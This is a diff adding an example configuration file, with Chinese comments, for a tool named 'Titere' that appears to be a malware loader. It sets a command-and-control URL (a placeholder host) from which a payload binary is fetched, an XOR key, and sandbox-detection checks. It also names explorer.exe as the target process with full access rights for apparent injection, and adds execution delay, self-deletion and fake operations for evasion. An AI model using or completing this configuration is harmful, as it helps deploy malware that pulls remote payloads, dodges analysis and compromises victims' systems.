@@ -1,0 +1,37 @@
+# Titere 配置文件示例
+# 复制此文件为 config.toml 并根据需要修改
+
+[server]
+# C2服务器配置
+url = "http://your-c2-server.com:port/output.bin"
+timeout = 30
+retry_count = 3
+
+[encryption]
+# 加密配置
+key = [0x1A, 0x2B, 0x3C, 0x4D, 0x5E, 0x6F, 0x7A, 0x8B]
+algorithm = "xor"
+
+[sandbox_detection]
+# 沙箱检测配置
+uptime_threshold = 300000  # 5分钟（毫秒）
+idle_threshold = 120000    # 2分钟（毫秒）
+check_processes = true
+check_username = true
+
+[target_process]
+# 目标进程配置
+name = "explorer.exe"
+access_rights = 0x1F0FFF  # PROCESS_ALL_ACCESS
+
+[behavior]
+# 行为配置
+delay_before_execution = 30  # 延迟执行时间（秒）
+self_delete = true
+fake_operations = true
+
+[logging]
+# 日志配置
+level = "info"
+file = "titere.log"
+console_output = true 
